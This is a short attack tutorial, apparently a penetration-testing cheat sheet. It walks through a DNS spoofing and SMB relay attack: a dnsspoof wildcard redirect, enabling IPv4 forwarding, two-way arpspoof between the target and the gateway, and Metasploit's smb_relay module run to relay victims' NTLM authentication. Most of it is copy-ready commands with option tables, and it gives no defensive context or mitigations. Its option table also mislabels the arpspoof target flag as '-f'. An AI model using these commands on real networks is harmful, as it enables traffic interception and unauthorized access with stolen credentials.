A DNS spoofing and SMB relay attack leverages misconfigured or insecure networks to intercept traffic and relay authentication credentials to gain unauthorized access to systems. It combines DNS spoofing to redirect traffic and SMB relay to capture and relay NTLM authentication hashes.

## 1. DNS Spoofing Setup

**DNS spoofing** involves impersonating a DNS server to redirect a victim's traffic to an attacker-controlled machine.

| Option         | Description                                                                  |
| -------------- | ---------------------------------------------------------------------------- |
| **`ip`**       | Replace with the attacker's IP address.                                      |
| **`*.domain`** | Wildcard to redirect all subdomains of the specified domain to the attacker. |
| **`-i eth1`**  | Specifies the network interface to listen on.                                |
| **`-f dns`**   | Specifies the DNS spoofing configuration file.                               |

```bash
echo "<ip> *.domain" > dns
dnsspoof -i eth1 -f dns
```

## 2. Enable IP Forwarding

This command enables IPv4 packet forwarding, allowing the attacker to act as a relay between the victim and the gateway.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

##  3. ARP Spoofing

ARP spoofing poisons the ARP cache of the target and gateway, allowing the attacker to position themselves as a man-in-the-middle.

| Option          | Description                                     |
| --------------- | ----------------------------------------------- |
| **`gateway`**   | The IP address of the network gateway (router). |
| **`-i eth1`**   | Specifies the network interface to use.         |
| **`-f target`** | The IP address of the target machine.           |
```bash
arpspoof -i eth1 -t target gateway
arpspoof -i eth1 -t gateway target
```

## 4. SMB Relay with Metasploit

The SMB relay attack exploits NTLM authentication by intercepting SMB requests and relaying them to a legitimate server to authenticate as the victim.

1. Use the SMB relay module:

```bash
use windows/smb/smb_relay
```

2. Configure the module options:

- Set the target IP and other necessary parameters, such as `SRVHOST` and `LHOST`.
- Ensure the listener is ready to capture and relay the credentials.

3. Run the attack:

```bash
exploit
```